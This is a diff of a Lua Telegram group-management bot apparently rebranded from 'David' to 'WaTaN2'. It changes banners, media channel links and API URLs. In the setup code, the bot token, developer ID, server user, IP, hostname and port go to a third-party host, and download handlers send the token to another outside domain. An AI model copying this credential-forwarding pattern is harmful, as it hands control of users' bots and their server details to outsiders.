@@ -25,7 +25,7 @@ if not DevAbs:get(Server.."IdWaTaN2") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://api-watan.ml/WaTaN2/index.php?Ban=David&Info&Id="..DevId)
+data,res = https.request("https://api-watan.ml/Api/WaTaN2/index.php?Ban=WaTaN2&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -77,7 +77,7 @@ WaTaN2 = DevAbs:get(Server.."TokenWaTaN2"):match("(%d+)"),
 SudoIds = {DevAbs:get(Server.."IdWaTaN2")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-watan.ml/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://api-watan.ml/Api/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("WaTaN2.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -130,14 +130,18 @@ return config
 end  
 Load_WaTaN2() 
 print("\27[36m"..[[          
-
-___________                    
-\__    ___/______  _______  ___
-  |    |  \_  __ \/  _ \  \/  /
-  |    |   |  | \(  <_> >    < 
-  |____|   |__|   \____/__/\_ \
-                             \/
-
+--------------------------------------------
+|       ╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗       |
+|       ║║║║║║     ║╔╗╔╗║     ║║╚╗║║       |
+|       ║║║║║║╔══╗ ╚╝║║╚╝╔══╗ ║╔╗╚╝║       |
+|       ║╚╝╚╝║╚ ╗║   ║║  ╚ ╗║ ║║╚╗║║       |
+|       ╚╗╔╗╔╝║╚╝╚╗ ╔╝╚╗ ║╚╝╚╗║║ ║║║       |
+|        ╚╝╚╝ ╚═══╝ ╚══╝ ╚═══╝╚╝ ╚═╝       |
+|                                          |
+|           > CH › @WaTaNTeaM              |
+|        ~> DEVELOPER › @abbasfadhil       |
+|               - WaTaN2 -                 |
+--------------------------------------------
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
@@ -1018,20 +1022,20 @@ if DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)') the
 local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)')
 https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
 DeleteMessage(Chat_Id2,{[0] = MsgId2})
-https.request('https://ccccxcc.ml/Trox/Yt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
+https.request('https://ccccxcc.ml/WaTaN2/Yt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)') then
 local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)')
 https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
-https.request('https://ccccxcc.ml/Trox/Yt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
+https.request('https://ccccxcc.ml/WaTaN2/Yt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)') then
 local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)')
 https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
-https.request('https://ccccxcc.ml/Trox/Yt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
+https.request('https://ccccxcc.ml/WaTaN2/Yt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)') then
 local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)')
 https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
 DeleteMessage(Chat_Id2,{[0] = MsgId2})
-https.request('https://ccccxcc.ml/Trox/Yt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
+https.request('https://ccccxcc.ml/WaTaN2/Yt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
 end
 if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abs = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
@@ -1097,7 +1101,7 @@ Abs = math.random(4,2824);
 local Text ='*✯︙تم اختيار المقطع الصوتي لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/Song:"..data.sender_user_id_}},{{text=". WaTaN TeaM ✯",url="t.me/WaTaNTeaM"}}} 
-return https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. data.chat_id_ .. '&voice=https://t.me/AudiosDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+return https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. data.chat_id_ .. '&voice=https://t.me/AudiosWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 else
 end
 --     Source WaTaN2     --
@@ -1107,7 +1111,7 @@ Abs = math.random(2,1167);
 local Text ='*✯︙تم اختيار المقطع الصوتي لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/mp3:"..data.sender_user_id_}},{{text=". WaTaN TeaM ✯",url="t.me/WaTaNTeaM"}}} 
-return https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id=' .. data.chat_id_ .. '&audio=https://t.me/DavidMp3/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+return https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id=' .. data.chat_id_ .. '&audio=https://t.me/WaTaN2Mp3/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 else
 end
 --     Source WaTaN2     --
@@ -1117,7 +1121,7 @@ Abs = math.random(2,1201);
 local Text ='*✯︙تم اختيار مقطع الميمز لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/memz:"..data.sender_user_id_}},{{text=". WaTaN TeaM ✯",url="t.me/WaTaNTeaM"}}} 
-return https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. data.chat_id_ .. '&voice=https://t.me/MemzDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+return https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. data.chat_id_ .. '&voice=https://t.me/MemzWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 else
 end
 --     Source WaTaN2     --
@@ -1127,7 +1131,7 @@ Abs = math.random(2,1075);
 local Text ='*✯︙تم اختيار المتحركه لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/gif:"..data.sender_user_id_}},{{text=". WaTaN TeaM ✯",url="t.me/WaTaNTeaM"}}} 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. data.chat_id_ .. '&animation=https://t.me/GifDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. data.chat_id_ .. '&animation=https://t.me/GifWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if DataText and DataText:match('/photo:'..tonumber(data.sender_user_id_)..'(.*)') then
@@ -1136,7 +1140,7 @@ Abs = math.random(4,1171);
 local Text ='*✯︙تم اختيار الصوره لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/photo:"..data.sender_user_id_}},{{text=". WaTaN TeaM ✯",url="t.me/WaTaNTeaM"}}} 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/PhotosDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/PhotosWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if DataText and DataText:match('/anime:'..tonumber(data.sender_user_id_)..'(.*)') then
@@ -1145,7 +1149,7 @@ Abs = math.random(3,1002);
 local Text ='*✯︙تم اختيار صورة الانمي لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/anime:"..data.sender_user_id_}},{{text=". WaTaN TeaM ✯",url="t.me/WaTaNTeaM"}}} 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/AnimeDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/AnimeWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if DataText and DataText:match(tonumber(data.sender_user_id_)..':SetMem:(.*)') then
@@ -1660,7 +1664,7 @@ keyboard = {}
 keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/CmdList:"..data.sender_user_id_}}}
 return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
---     Source David     --
+--     Source WaTaN2     --
 if DataText and DataText:match('/On:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abs = DataText:match('/On:'..tonumber(data.sender_user_id_)..'(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(extra,result,success)
@@ -1732,7 +1736,7 @@ end
 end,nil)
 end,nil)
 end
---     Source David     --
+--     Source WaTaN2     --
 if DataText and DataText:match('/Stop:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abs = DataText:match('/Stop:'..tonumber(data.sender_user_id_)..'(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(extra,result,success)
@@ -1774,7 +1778,7 @@ end
 end,nil)
 end,nil)
 end
---     Source David     --
+--     Source WaTaN2     --
 if DataText and DataText:match('/SetCmdGp:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abs = DataText:match('/SetCmdGp:'..tonumber(data.sender_user_id_)..'(.*)')
 DevAbs:set(WaTaN2.."Set:Cmd:Group:New1"..data.chat_id_..":ا","ايدي")
@@ -1816,7 +1820,7 @@ keyboard = {}
 keyboard.inline_keyboard = {{{text="‹ رجوع ›",callback_data="/Reload:"..data.sender_user_id_}},{{text='‹ WaTaN TeaM ›',url="t.me/WaTaNTeaM"}}}
 return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
---     Source David     --
+--     Source WaTaN2     --
 if DataText and DataText:match('/Reload:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abs = DataText:match('/Reload:'..tonumber(data.sender_user_id_)..'(.*)')
 Text = "✯︙تم تفعيل المجموعه"
@@ -1824,7 +1828,7 @@ keyboard = {}
 keyboard.inline_keyboard = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..data.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..data.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..data.sender_user_id_}},{{text="‹ WaTaN TeaM ›",url="t.me/WaTaNTeaM"}}}
 https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
---     Source David     -- 
+--     Source WaTaN2     -- 
 if DataText and DataText:match('/UploadAdmin:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abs = DataText:match('/UploadAdmin:'..tonumber(data.sender_user_id_)..'(.*)')
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = data.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,Abs) 
@@ -11040,7 +11044,7 @@ local Text ='*✯︙تم اختيار المتحركه لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/gif:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تفعيل الميمز" and Manager(msg) and ChCheck(msg) then
@@ -11059,7 +11063,7 @@ local Text ='*✯︙تم اختيار مقطع الميمز لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/memz:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل غنيلي" and Manager(msg) and ChCheck(msg) then
@@ -11078,7 +11082,7 @@ local Text ='*✯︙تم اختيار المقطع الصوتي لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/Song:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تفعيل اغنيه" and Manager(msg) and ChCheck(msg) then
@@ -11097,7 +11101,7 @@ local Text ='*✯︙تم اختيار الاغنيه لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/mp3:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id=' .. msg.chat_id_ .. '&audio=https://t.me/DavidMp3/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id=' .. msg.chat_id_ .. '&audio=https://t.me/WaTaN2Mp3/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تفعيل الريمكس" and Manager(msg) and ChCheck(msg) then
@@ -11116,7 +11120,7 @@ local Text ='*✯︙تم اختيار الريمكس لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/remix:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل صوره" and Manager(msg) and ChCheck(msg) or text == "تفعيل الصوره" and Manager(msg) and ChCheck(msg) then
@@ -11135,7 +11139,7 @@ local Text ='*✯︙تم اختيار الصوره لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/photo:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل انمي" and Manager(msg) and ChCheck(msg) or text == "تفعيل الانمي" and Manager(msg) and ChCheck(msg) then
@@ -11154,7 +11158,7 @@ local Text ='*✯︙تم اختيار صورة الانمي لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/anime:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل فلم" and Manager(msg) and ChCheck(msg) then
@@ -11173,7 +11177,7 @@ local Text ='*✯︙تم اختيار الفلم لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/Movies:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if text == "تفعيل مسلسل" and Manager(msg) and ChCheck(msg) then
@@ -11192,7 +11196,7 @@ local Text ='*✯︙تم اختيار المسلسل لك*'
 keyboard = {}  
 keyboard.inline_keyboard = {{{text=". مره اخرى ✯",callback_data="/series:"..msg.sender_user_id_}},{{text = '✯ WaTaN2 Team .',url="t.me/WaTaNTeaM"}}} 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesWaTaN2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source WaTaN2     --
 if Admin(msg) then
@@ -12972,7 +12976,7 @@ end
 if text and text:match('^بحث (.*)$') and not DevAbs:get(WaTaN2.."Abs:WhyTube"..msg.chat_id_) and ChCheck(msg) then            
 local Text = text:match('^بحث (.*)$') 
 local msg_id = msg.id_/2097152/0.5 
-https.request('https://ccccxcc.ml/Trox/Yt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
+https.request('https://ccccxcc.ml/WaTaN2/Yt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
 end
 --     Source WaTaN2     --
 if SecondSudo(msg) then
